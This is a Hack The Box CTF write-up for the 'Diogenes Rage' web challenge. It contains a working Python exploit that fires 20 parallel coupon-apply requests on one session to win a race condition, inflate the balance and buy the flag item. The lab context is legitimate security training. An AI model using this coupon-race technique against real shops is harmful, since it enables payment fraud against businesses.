## **HTB** 
### **Difficult:** easy
### **Type:** Race condition
___
### **Description:**
Having missed the flight as you walk down the street, a wild vending machine appears in your way. You check your pocket and there it is, yet another half torn voucher coupon to feed to the consumerism. You start wondering why should you buy things that you don't like with the money you don't have for the people you don't like. You're Jack's raging bile duct.

Author: Rayhan0x01
___

### **Vulnerable code:** ###
![1.png](https://github.com/L4P1Nz/HackTheBox/blob/main/Challenges/Web/Diogenes%20Rage/Media/1.png)
### **Exploit:** ###
```python
import requests
from multiprocessing import Process

url = "http://167.172.55.94:31451"
purchase_endpoint = "/api/purchase"
coupon_endpoint = "/api/coupons/apply"

purchase_A1 = {"item": "A1"}
purchase_C8 = {"item": "C8"}
coupon_data = {"coupon_code": "HTB_100"}

def request_coupon(cookie):
    requests.post(url=url+coupon_endpoint, data=coupon_data, cookies=cookie)


while (1):
    response = requests.post(url=url+purchase_endpoint, data=purchase_A1)
    cookie = {
        "session": response.cookies['session']
    }
    processes = []
    for i in range(20):
        new_process = Process(target=request_coupon, args=(cookie, ))
        processes.append(new_process)
    
    for process in processes:
        process.start()
    for process in processes:
        process.join()
    
    response = requests.post(url=url+purchase_endpoint, data=purchase_A1, cookies=cookie)
    print("Show balance: ", response.text)

    response = requests.post(url=url+purchase_endpoint, data=purchase_C8, cookies=cookie)
    print("Flag? :", response.text)
```
